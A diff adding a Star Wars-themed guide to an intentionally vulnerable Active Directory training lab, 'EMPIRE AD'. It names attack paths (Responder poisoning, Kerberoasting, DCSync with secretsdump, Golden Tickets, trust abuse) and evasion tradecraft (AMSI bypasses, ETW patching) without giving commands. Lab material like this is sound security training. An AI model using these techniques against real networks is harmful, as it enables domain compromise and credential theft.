+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
